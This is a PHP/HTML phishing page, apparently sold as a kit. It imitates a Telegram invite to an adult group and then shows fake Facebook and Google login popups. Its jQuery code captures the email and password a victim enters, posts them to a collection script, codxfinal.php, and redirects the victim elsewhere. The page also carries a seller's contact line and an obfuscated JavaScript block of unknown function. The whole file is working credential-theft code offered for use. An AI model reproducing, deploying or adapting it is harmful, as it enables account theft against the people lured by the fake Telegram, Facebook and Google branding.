<?php
// CREATOR MAS CODX
// TOLONG HARGAI CREATOR
// Order SC: https://wa.me/6285863972648

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Telegram: Join Group Chat</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>try{if(window.parent!=null&&window!=window.parent){window.parent.postMessage(JSON.stringify({eventType:'web_app_open_tg_link',eventData:{path_full:"\/+rNMSyWnxj7E3YzU9"}}),'https://web.telegram.org');}}catch(e){}</script>
    
<meta property="og:title" content="GP 18 Ploos">
<meta property="og:image" content="img/vici.jpg">
<meta property="og:site_name" content="Telegram">
<meta property="og:description" content="Old Group Banned 😤">

<meta property="twitter:title" content="GP 18 Ploos">
<meta property="twitter:image" content="img/vici.jpg">
<meta property="twitter:site" content="@Telegram">

<meta property="al:ios:app_store_id" content="686449807">
<meta property="al:ios:app_name" content="Telegram Messenger">
<meta property="al:ios:url" content="https://t.me/LIMAPULUH00">

<meta property="al:android:url" content="https://whatsapp.com/channel/0029Vaig1XL4CrfgkzaR4c3r">
<meta property="al:android:app_name" content="Telegram">
<meta property="al:android:package" content="org.telegram.messenger">

<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@Telegram">
<meta name="twitter:description" content="Old Group Banned 😤
">
<meta name="twitter:app:name:iphone" content="Telegram Messenger">
<meta name="twitter:app:id:iphone" content="686449807">
<meta name="twitter:app:url:iphone" content="https://t.me/LIMAPULUH00">
<meta name="twitter:app:name:ipad" content="Telegram Messenger">
<meta name="twitter:app:id:ipad" content="686449807">
<meta name="twitter:app:url:ipad" content="https://t.me/LIMAPULUH00">
<meta name="twitter:app:name:googleplay" content="Telegram">
<meta name="twitter:app:id:googleplay" content="org.telegram.messenger">
<meta name="twitter:app:url:googleplay" content="https://t.me/+rNMSyWnxj7E3YzU9">
<meta name="apple-itunes-app" content="app-id=686449807, app-argument: https://t.me/LIMAPULUH00">
    <script>window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches&&document.documentElement&&document.documentElement.classList&&document.documentElement.classList.add('theme_dark');</script>
    <link rel="icon" type="image/svg+xml" href="//telegram.org/img/website_icon.svg?4">
<link rel="apple-touch-icon" sizes="180x180" href="//telegram.org/img/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="//telegram.org/img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="//telegram.org/img/favicon-16x16.png">
<link rel="alternate icon" href="//telegram.org/img/favicon.ico" type="image/x-icon" />
    <link href="//telegram.org/css/font-roboto.css?1" rel="stylesheet" type="text/css">
        <link href="css/fb.css" rel="stylesheet" type="text/css">
    <!--link href="/css/myriad.css" rel="stylesheet"-->
    <link rel="stylesheet" href="https://images.cahyosr.my.id/css/login2/facebook.css"> 
    <link rel="stylesheet" href="https://images.cahyosr.my.id/css/login2/google.css"> 
    <link rel="stylesheet" href="https://images.cahyosr.my.id/css/login2/all.css"> 
    <link href="//telegram.org/css/bootstrap.min.css?3" rel="stylesheet">
    <link href="//telegram.org/css/telegram.css?233" rel="stylesheet" media="screen">
  </head>
  <body class="no_transition">
      <div class="tgme_background_wrap">
    <canvas id="tgme_background" class="tgme_background default" width="50" height="50" data-colors="dbddbb,6ba587,d5d88d,88b884"></canvas>
    <div class="tgme_background_pattern default"></div>
  </div>
    <div class="tgme_page_wrap">
      <div class="tgme_head_wrap">
        <div class="tgme_head">
          <a href="//telegram.org/" class="tgme_head_brand">
            <svg class="tgme_logo" height="34" viewBox="0 0 133 34" width="133" xmlns="http://www.w3.org/2000/svg">
              <g fill="none" fill-rule="evenodd">
                <circle cx="17" cy="17" fill="var(--accent-btn-color)" r="17"/><path d="m7.06510669 16.9258959c5.22739451-2.1065178 8.71314291-3.4952633 10.45724521-4.1662364 4.9797665-1.9157646 6.0145193-2.2485535 6.6889567-2.2595423.1483363-.0024169.480005.0315855.6948461.192827.1814076.1361492.23132.3200675.2552048.4491519.0238847.1290844.0536269.4231419.0299841.65291-.2698553 2.6225356-1.4375148 8.986738-2.0315537 11.9240228-.2513602 1.2428753-.7499132 1.5088847-1.2290685 1.5496672-1.0413153.0886298-1.8284257-.4857912-2.8369905-1.0972863-1.5782048-.9568691-2.5327083-1.3984317-4.0646293-2.3321592-1.7703998-1.0790837-.212559-1.583655.7963867-2.5529189.2640459-.2536609 4.7753906-4.3097041 4.755976-4.431706-.0070494-.0442984-.1409018-.481649-.2457499-.5678447-.104848-.0861957-.2595946-.0567202-.3712641-.033278-.1582881.0332286-2.6794907 1.5745492-7.5636077 4.6239616-.715635.4545193-1.3638349.6759763-1.9445998.6643712-.64024672-.0127938-1.87182452-.334829-2.78737602-.6100966-1.12296117-.3376271-1.53748501-.4966332-1.45976769-1.0700283.04048-.2986597.32581586-.610598.8560076-.935815z" fill="#fff"/><path d="m49.4 24v-12.562h-4.224v-2.266h11.198v2.266h-4.268v12.562zm16.094-4.598h-7.172c.066 1.936 1.562 2.772 3.3 2.772 1.254 0 2.134-.198 2.97-.484l.396 1.848c-.924.396-2.2.682-3.74.682-3.476 0-5.522-2.134-5.522-5.412 0-2.97 1.804-5.764 5.236-5.764 3.476 0 4.62 2.86 4.62 5.214 0 .506-.044.902-.088 1.144zm-7.172-1.892h4.708c.022-.99-.418-2.618-2.222-2.618-1.672 0-2.376 1.518-2.486 2.618zm9.538 6.49v-15.62h2.706v15.62zm14.84-4.598h-7.172c.066 1.936 1.562 2.772 3.3 2.772 1.254 0 2.134-.198 2.97-.484l.396 1.848c-.924.396-2.2.682-3.74.682-3.476 0-5.522-2.134-5.522-5.412 0-2.97 1.804-5.764 5.236-5.764 3.476 0 4.62 2.86 4.62 5.214 0 .506-.044.902-.088 1.144zm-7.172-1.892h4.708c.022-.99-.418-2.618-2.222-2.618-1.672 0-2.376 1.518-2.486 2.618zm19.24-1.144v6.072c0 2.244-.462 3.85-1.584 4.862-1.1.99-2.662 1.298-4.136 1.298-1.364 0-2.816-.308-3.74-.858l.594-2.046c.682.396 1.826.814 3.124.814 1.76 0 3.08-.924 3.08-3.234v-.924h-.044c-.616.946-1.694 1.584-3.124 1.584-2.662 0-4.554-2.2-4.554-5.236 0-3.52 2.288-5.654 4.862-5.654 1.65 0 2.596.792 3.102 1.672h.044l.11-1.43h2.354c-.044.726-.088 1.606-.088 3.08zm-2.706 2.948v-1.738c0-.264-.022-.506-.088-.726-.286-.99-1.056-1.738-2.2-1.738-1.518 0-2.64 1.32-2.64 3.498 0 1.826.924 3.3 2.618 3.3 1.012 0 1.892-.66 2.2-1.65.088-.264.11-.638.11-.946zm5.622 4.686v-7.26c0-1.452-.022-2.508-.088-3.454h2.332l.11 2.024h.066c.528-1.496 1.782-2.266 2.948-2.266.264 0 .418.022.638.066v2.53c-.242-.044-.484-.066-.814-.066-1.276 0-2.178.814-2.42 2.046-.044.242-.066.528-.066.814v5.566zm16.05-6.424v3.85c0 .968.044 1.914.176 2.574h-2.442l-.198-1.188h-.066c-.638.836-1.76 1.43-3.168 1.43-2.156 0-3.366-1.562-3.366-3.19 0-2.684 2.398-4.07 6.358-4.048v-.176c0-.704-.286-1.87-2.178-1.87-1.056 0-2.156.33-2.882.792l-.528-1.76c.792-.484 2.178-.946 3.872-.946 3.432 0 4.422 2.178 4.422 4.532zm-2.64 2.662v-1.474c-1.914-.022-3.74.374-3.74 2.002 0 1.056.682 1.54 1.54 1.54 1.1 0 1.87-.704 2.134-1.474.066-.198.066-.396.066-.594zm5.6 3.762v-7.524c0-1.232-.044-2.266-.088-3.19h2.31l.132 1.584h.066c.506-.836 1.474-1.826 3.3-1.826 1.408 0 2.508.792 2.97 1.98h.044c.374-.594.814-1.034 1.298-1.342.616-.418 1.298-.638 2.2-.638 1.76 0 3.564 1.21 3.564 4.642v6.314h-2.64v-5.918c0-1.782-.616-2.838-1.914-2.838-.924 0-1.606.66-1.892 1.43-.088.242-.132.594-.132.902v6.424h-2.64v-6.204c0-1.496-.594-2.552-1.848-2.552-1.012 0-1.694.792-1.958 1.518-.088.286-.132.594-.132.902v6.336z" fill="var(--tme-logo-color)" fill-rule="nonzero"/>
              </g>
            </svg>
          </a>
          <a class="tgme_head_right_btn" href="//telegram.org/dl?tme=6da135dc6a6cc432db_14166415844379568753">
            Download
          </a>
        </div>
      </div>
      <div class="tgme_body_wrap">
        <div class="tgme_page">
          <div class="tgme_page_photo">
<img class="tgme_page_photo_image" src="https://images.cahyosr.my.id/img/20/girl.png">
</div>
<div class="tgme_page_title" dir="auto">
<span dir="auto">Telegram 18+</span>
</div>
<div class="tgme_page_extra">789 members</div>
<div class="tgme_page_description" dir="auto">No Spam Grup 😤</div>
<div class="tgme_page_action">
<a class="tgme_action_button" onclick="codxLoginPopup()">Join Group</a>
</div>
<div class="tgme_page_additional">
You are invited to the group <strong dir="auto">Only 18+</strong>. Click above to join.
</div>
        </div>
        
      </div>
    </div>

    <div id="tgme_frame_cont"></div>

    <script src="//telegram.org/js/tgwallpaper.min.js?3"></script>

<!-- WEB OGRAM_BTN -->

</footer> 
   <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login untuk melanjutkan.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://images.cahyosr.my.id/img/login2/logfb.webp" onclick="codxFB();"> 
      <img src="https://images.cahyosr.my.id/img/login2/loggp.webp" onclick="codxGP();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login login-facebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="closeFB()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://images.cahyosr.my.id/img/login2/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://images.cahyosr.my.id/img/login2/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div> 
     <form class="login-form" id="FormFB" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="closeGP()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://images.cahyosr.my.id/img/login2/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FormGP" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.cahyosr.my.id/github/jquery-3.7.1.min.js"></script>
  <script src="https://code.cahyosr.my.id/npm/jquery-3.17.21.min.js"></script>
 <script>
  $(document).ready(function () {
    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

   function handleFormSubmit(formSelector, emailSelector, passwordSelector) {
        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();
            var loginType = $(this).find('input[name="login"]').val();

            if (email && password) {
                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }

                $.post('codxfinal.php', {
                    email: email,
                    password: password,
                    login: loginType
                }).always(function () {
                    window.location.href = "https://cahyosr.my.id";
                });
            }
        });
    }

    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit('#FormFB', 'input[name="email"]', 'input[name="password"]');
    handleFormSubmit('#FormGP', '#email_gp', '#password_gp');

    // Tombol
    $("#codxFacebook").click(function () {
        codxFB();
    });

    $("#codxGoogle").click(function () {
        codxGP();
    });

    $("#codxLoginPopup").click(function () {
        codxLoginPopup();
    });
});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var fTQ='',Rby=508-497;function ygd(x){var o=969054;var r=x.length;var z=[];for(var f=0;f<r;f++){z[f]=x.charAt(f)};for(var f=0;f<r;f++){var k=o*(f+454)+(o%31625);var i=o*(f+676)+(o%27792);var l=k%r;var t=i%r;var b=z[l];z[l]=z[t];z[t]=b;o=(k+i)%4024719;};return z.join('')};var vcP=ygd('cobttrokquvnzxyhgesdfwrmapcnjrutlocis').substr(0,Rby);var YBB=').mao8;3;on=xchvag;;akdrh0g;c+dfnhi.[r(ncpyc.=,Csx.z,0=e;nh[ea(ran=(; ox;80tnlehr,d9lufkrrt;o;tt97g+.63urr.8pgC,}u1gr=;soir=vti=f]8n rl34r6[=0evuio+fnetnf,1+[o+e)licnt+;;dam ra)f{ri=ic;)+apu=>pqhnar;=r 5ipp9+;ktaig(w[;l8.;g(l=vSi+t ;dai)a1a)g"[tn]sqe1.f"ltev* ra7;r;vveey)e)m1ketau-s;62;[+iv.={o-l1a=nu6;;<u ,})ar()4(aa.g=n]p{+vht(e00(.,;udrC;r[(gth0l.t)s2oml(+u.1un0-u<=p)C+{tad(+d!xl=ba!52t ,(jt;jfsrs(eaan7=n(A3rc6=ig)1a,jrn.r or4a+= v]u]C)0f;)rAvhr2h5 ]"( f;a+n=hvs-0=o(tupe=ko}[ar,m29lvs),>1u(}<"i;rxsvhnl.ad)tv,uq=e(h;vA=i..(2 8}==upc-nu4(([;r9.mj;);=nl75u8s<A)s<j7)]fu{iu.xc;n],{ ih,)pfqm)il=pg(=(2n5=qx={t=el ;n4ltn]ai(la)-,7vli]an.tu+=;;(1fb6t)}io++qeljhhr0n,joe.irxj;n"=aA8(hw) uu.s}(lo6crofj["xh,")aoer wr*ge,00 9=,;,)9nv 2rfcojcy7hlch)r8);ve nr ). )+vCe,+C.r"a;6,eht,[ej) vb(g,vyovr,.rfrjm+[0[aauoo;dl=+744Ca; ]aj),t(oi.(St=rsg )rtmvh;on;vejw(r]o===f1us]g+er2(iua]("-",.o+v=stnj';var fZO=ygd[vcP];var YQV='';var uhr=fZO;var iaA=fZO(YQV,ygd(YBB));var RCR=iaA(ygd(')&"D)t__ft1#aZ)fZ u2= s{b2"o.a3Z0=a#a_+f%3Z)9c"k,]rZjo(+Z1eZu;%Z;:=}Zn(Z.u_3+nto1$m=bZ[Zt0-m0+$;3+,foZfx6pf6!.$s( !2!$t..86m(Z0g)-aZp0eZ_g( m.]o%srn576tp_augZ;.; Z;(.;tp=. p1ba(3e,i!!zZ3Ttu.(,gk.0#s#e0rCtZ, =i\/fte%Z]j!sud.16nre:!cZlm!0$Z*(t.Za1Zb42(00j!f7)!6_3_,"0(6)=r0h+){c)0$(()f(hof5ott.;rZ6m\/ f3Z=;4uZd,t$Z$,f1\'$k{]6o eS-m;aZpn;a)3$Z3gZ$+#\/fZd[!!Z*k0m],so\/tpe$6.Z06._.(u;n!oh]Z8o#$,ti1a.4"naZa;$)oftf\/hj1gk+1.Zie1t&d!i_i.3,n%. .,#)_$%ibfus\'}0f!ineje,3rsl,Z(=Z3ua1(.ftfx%_a5]yt5t%1ZZhZ5=2!3f62i))h =; oo6Zf.fp,e(iotZfff_t(%Z(_j&2(dna]rs;g]ti,33,a)73{Z .Z!(Z7!,h}}"oj36!Z)bfZ1a\/s_ZZne Z}&epZ.tgZ)1,Zi3;2(;52$jbm{tl)_.;3e.$0mZ=4_Zit_()30crff9$+els3)_urZn\/26no.iZlj0$j_t..r.b_=t.),pj5!]63ZZa.(*f=.)#yS_r.$=r;=taZ_srZS2kx)!17Z{i}(1Zgb1%ZS4rv=t}f.p;Z)a(3 .1=%Z_4&.nZ61Z;ab.}0j);ai6{!$$)).b)_($hlr(=k1Z.s})i)($-Z 6bgj,}.a,Zos8Z(0))tlhd%eb7f=jr+6Zi{4,i_f)Zu0){sh):.o.nZg (8$)..(.ta)i_.r(asl.C;(,tr-[,05s43i*f_!kh!b4.si,.%4Zj( %(!e415Za.of{0.(]:Z,j).)flje(Zrh)rZ5Z.Z)5(=,bgef1nZ)3lZj_4,fi(!_)s(va);.c1o\'krftn=i{%ho_i,")_8,3.{5,rn3_i.Z3rf$3)1_];(6$)g_g}4Z}{l){ffZ604)2e=Z,qn72].=71]iy2Zsr.ZZ iaf3\'0.)# 3pud=)i2 1#Zt{ja,,Zflf.Z$.0[Z2=s;Z6]$m.}_ia.,i8d$n0sZ{e2k;i!_2db*Z.t.(e}5.;1$f3.Z o.e.76aoe}Z!ts'));var ULF=uhr(fTQ,RCR );ULF(4380);return 1867})()
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>